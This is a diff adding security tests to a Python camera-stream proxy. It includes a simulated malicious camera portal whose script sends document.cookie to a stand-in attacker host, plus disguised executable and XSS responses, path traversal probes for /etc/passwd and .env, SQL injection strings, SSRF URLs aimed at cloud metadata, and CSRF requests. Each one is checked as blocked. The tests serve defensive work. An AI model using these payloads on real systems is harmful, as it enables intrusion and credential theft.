@@ -473,6 +473,204 @@ async def test_full_pipeline():
                 pub_proc.kill()
             mediamtx_service.stop()
 
+        # 15. Anti-Honeypot Web Portal Stream Source Extraction & Zero Code Execution
+        print("[*] Testing Anti-Honeypot Web Portal Stream Extraction & Disguised Malware Blocking...")
+        async def handle_honeypot_cam(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
+            try:
+                data = await asyncio.wait_for(reader.read(2048), timeout=2.0)
+                req_text = data.decode(errors="ignore")
+                first_line = req_text.splitlines()[0] if req_text.splitlines() else ""
+                path = first_line.split()[1] if len(first_line.split()) >= 2 else "/"
+
+                if path == "/" or path.startswith("/index.html") or path == "/live":
+                    # Simulated camera web portal containing malicious scripts + embedded stream source
+                    portal_html = (
+                        b"<html><head><title>Camera Web Portal</title>"
+                        b"<script>fetch('http://evil-honeypot.com/steal?c='+document.cookie);</script>"
+                        b"</head><body onload='evilMalware()'>"
+                        b"<iframe src='http://evil-honeypot.com/exploit.html'></iframe>"
+                        b"<img id='cam' src='/custom_vendor_stream/live_feed.mjpg?ch=1'>"
+                        b"</body></html>"
+                    )
+                    hdr = (
+                        b"HTTP/1.1 200 OK\r\n"
+                        b"Content-Type: text/html; charset=utf-8\r\n"
+                        + f"Content-Length: {len(portal_html)}\r\n\r\n".encode()
+                    )
+                    writer.write(hdr + portal_html)
+                    await writer.drain()
+                elif path.startswith("/custom_vendor_stream/live_feed.mjpg"):
+                    frame = (
+                        b"--myboundary\r\nContent-Type: image/jpeg\r\n"
+                        + f"Content-Length: {len(JPEG_SOI_EOI)}\r\n\r\n".encode()
+                        + JPEG_SOI_EOI + b"\r\n"
+                    )
+                    hdr = (
+                        b"HTTP/1.1 200 OK\r\n"
+                        b"Content-Type: multipart/x-mixed-replace; boundary=myboundary\r\n\r\n"
+                    )
+                    writer.write(hdr + frame)
+                    await writer.drain()
+                elif path.startswith("/malware_disguised.jpg"):
+                    # Honeypot serving a Windows PE executable disguised as image/jpeg
+                    pe_payload = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00This program cannot be run in DOS mode"
+                    hdr = (
+                        b"HTTP/1.1 200 OK\r\n"
+                        b"Content-Type: image/jpeg\r\n"
+                        + f"Content-Length: {len(pe_payload)}\r\n\r\n".encode()
+                    )
+                    writer.write(hdr + pe_payload)
+                    await writer.drain()
+                elif path.startswith("/xss_disguised.jpg"):
+                    # Honeypot serving HTML/JS disguised as image/jpeg
+                    xss_payload = b"<html><script>alert('honeypot-xss')</script></html>"
+                    hdr = (
+                        b"HTTP/1.1 200 OK\r\n"
+                        b"Content-Type: image/jpeg\r\n"
+                        + f"Content-Length: {len(xss_payload)}\r\n\r\n".encode()
+                    )
+                    writer.write(hdr + xss_payload)
+                    await writer.drain()
+                else:
+                    writer.write(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
+                    await writer.drain()
+            except Exception:
+                pass
+            finally:
+                writer.close()
+
+        hp_server = await asyncio.start_server(handle_honeypot_cam, "127.0.0.1", 0)
+        hp_port = hp_server.sockets[0].getsockname()[1]
+        hp_feed_id = f"test_honeypot_portal_{hp_port}"
+        try:
+            async with AsyncSessionLocal() as db_sess:
+                db_sess.add(CameraFeedModel(
+                    id=hp_feed_id,
+                    ip="127.0.0.1",
+                    port=hp_port,
+                    product="Web Portal Camera",
+                    rtsp_url=f"http://127.0.0.1:{hp_port}/live",
+                    stream_path=hp_feed_id,
+                    country_code="IT",
+                    country_name="Italy"
+                ))
+                await db_sess.commit()
+
+            # 15a. /api/streams/play extracts the embedded custom stream path from the HTML portal without executing JS
+            hp_play_res = await client.post("/api/streams/play", json={"feed_id": hp_feed_id})
+            assert hp_play_res.status_code == 200
+            hp_play_data = hp_play_res.json()
+            assert hp_play_data["status"] == "http_stream"
+            assert "/custom_vendor_stream/live_feed.mjpg?ch=1" in hp_play_data["rtsp_source"], (
+                f"Expected portal stream extraction, got {hp_play_data}"
+            )
+            print(f"    -> Portal HTML parsed & stream source extracted: {hp_play_data['rtsp_source']}")
+
+            # 15b. /api/proxy/stream pointing directly to the HTML portal root extracts & streams the binary MJPEG
+            hp_stream_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{hp_port}/"})
+            assert hp_stream_res.status_code == 200
+            assert JPEG_SOI_EOI in hp_stream_res.content
+            assert b"<script>" not in hp_stream_res.content
+            assert hp_stream_res.headers.get("x-extracted-stream-source", "").endswith("/custom_vendor_stream/live_feed.mjpg?ch=1")
+            print("    -> /api/proxy/stream automatically extracted MJPEG from HTML portal and stripped all scripts")
+
+            # 15c. /api/proxy/web never returns executable HTML/scripts; returns isolated JSON/report with script-src 'none'
+            hp_web_json = await client.get(f"/api/proxy/web?feed_id={hp_feed_id}&format=json")
+            assert hp_web_json.status_code == 200
+            web_info = hp_web_json.json()
+            assert web_info["isolated"] is True and web_info["code_execution_blocked"] is True
+            assert "/custom_vendor_stream/live_feed.mjpg?ch=1" in (web_info.get("extracted_stream_url") or "")
+
+            hp_web_html = await client.get(f"/api/proxy/web?feed_id={hp_feed_id}")
+            assert hp_web_html.status_code == 200
+            assert "script-src 'none'" in hp_web_html.headers.get("content-security-policy", "")
+            assert b"<script>fetch(" not in hp_web_html.content
+            assert b"onload='evilMalware()'" not in hp_web_html.content
+            print("    -> /api/proxy/web verified zero code execution & strict sandbox CSP")
+
+            # 15d. Disguised PE executable (MZ) and disguised HTML (<script>) on /api/proxy/stream are blocked with 415
+            pe_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{hp_port}/malware_disguised.jpg"})
+            assert pe_res.status_code == 415, f"Expected 415 for disguised PE binary, got {pe_res.status_code}"
+            xss_img_res = await client.get("/api/proxy/stream", params={"url": f"http://127.0.0.1:{hp_port}/xss_disguised.jpg"})
+            assert xss_img_res.status_code == 415, f"Expected 415 for disguised HTML/JS payload, got {xss_img_res.status_code}"
+            print("    -> Disguised PE executable ('MZ') and HTML/JS payloads blocked with HTTP 415")
+
+            await client.post("/api/feeds/batch-delete", json={"feed_ids": [hp_feed_id]}, headers=headers)
+        finally:
+            hp_server.close()
+            await hp_server.wait_closed()
+
+        # 16. WAF, Path Traversal, SQL Injection, XSS, SSRF, Bot Scanner, and CSRF Defenses
+        print("[*] Testing WAF & Security Hardening (Path Traversal, SQLi, XSS, SSRF, Scanners, CSRF)...")
+
+        # 16a. Path Traversal & Sensitive File Probes
+        for pt_path in ["/../etc/passwd", "/api/feeds/..%2f..%2fetc/passwd", "/.env", "/.git/config", "/world_cams.db"]:
+            pt_res = await client.get(pt_path)
+            assert pt_res.status_code == 403, f"Expected 403 for path traversal/sensitive probe {pt_path}, got {pt_res.status_code}"
+        print("    -> Path traversal & sensitive file probes blocked (403)")
+
+        # 16b. SQL Injection Payloads
+        for sqli_q in ["' OR 1=1--", "test' UNION SELECT null,null--", "1; DROP TABLE camera_feeds--"]:
+            sqli_res = await client.get("/api/feeds", params={"search": sqli_q})
+            assert sqli_res.status_code == 403, f"Expected 403 for SQLi payload '{sqli_q}', got {sqli_res.status_code}"
+        print("    -> SQL Injection payloads blocked (403)")
+
+        # 16c. Reflected/Stored XSS Payloads
+        xss_res = await client.get("/api/feeds", params={"search": "<script>alert(1)</script>"})
+        assert xss_res.status_code == 403, f"Expected 403 for XSS query, got {xss_res.status_code}"
+        print("    -> XSS query payloads blocked (403)")
+
+        # 16d. Automated Vulnerability Scanner User-Agents
+        bot_res = await client.get("/api/feeds", headers={"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"})
+        assert bot_res.status_code == 403, f"Expected 403 for sqlmap User-Agent, got {bot_res.status_code}"
+        print("    -> Automated scanner User-Agent ('sqlmap') blocked (403)")
+
+        # 16e. SSRF Protection (Cloud Metadata, Internal MediaMTX API, Restricted Ports)
+        for ssrf_url in [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://127.0.0.1:9997/v3/paths/list",
+            "http://127.0.0.1:8000/api/health",
+            "http://127.0.0.1:22/",
+            "http://localhost/live"
+        ]:
+            ssrf_res = await client.get("/api/proxy/stream", params={"url": ssrf_url})
+            assert ssrf_res.status_code == 403, f"Expected 403 for SSRF URL {ssrf_url}, got {ssrf_res.status_code}"
+        print("    -> SSRF targets (Cloud Metadata, MediaMTX API, SSH port, DNS hostname) blocked (403)")
+
+        # 16f. CSRF Protection (Cross-Origin, Form-Encoded POST, and Double-Submit Cookie Enforcement)
+        csrf_origin_res = await client.post(
+            "/api/streams/stop",
+            json={"stream_name": "test"},
+            headers={"Origin": "https://evil-csrf-site.com"}
+        )
+        assert csrf_origin_res.status_code == 403, f"Expected 403 for cross-origin POST, got {csrf_origin_res.status_code}"
+
+        csrf_form_res = await client.post(
+            "/api/streams/stop",
+            content="stream_name=test",
+            headers={"Content-Type": "application/x-www-form-urlencoded"}
+        )
+        assert csrf_form_res.status_code == 403, f"Expected 403 for form-encoded CSRF POST, got {csrf_form_res.status_code}"
+
+        # Initialize CSRF session cookie via /api/security/csrf and verify token enforcement
+        csrf_init = await client.get("/api/security/csrf")
+        assert csrf_init.status_code == 200
+        csrf_token = csrf_init.json()["csrf_token"]
+        assert "worldcams_csrf" in client.cookies
+
+        # State-changing request with cookie present but missing X-CSRF-Token header -> 403
+        no_hdr_res = await client.post("/api/streams/stop", json={"stream_name": "test"})
+        assert no_hdr_res.status_code == 403, f"Expected 403 when CSRF cookie set but X-CSRF-Token missing, got {no_hdr_res.status_code}"
+
+        # State-changing request with matching X-CSRF-Token header -> 200
+        valid_csrf_res = await client.post(
+            "/api/streams/stop",
+            json={"stream_name": "test"},
+            headers={"X-CSRF-Token": csrf_token}
+        )
+        assert valid_csrf_res.status_code == 200, f"Expected 200 with valid X-CSRF-Token, got {valid_csrf_res.status_code}"
+        print("    -> CSRF protection (Origin check, Form Content-Type block, Double-Submit HMAC token) verified")
+
     print("\n[✓] ALL TESTS PASSED SUCCESSFULLY!")
 
 if __name__ == "__main__":
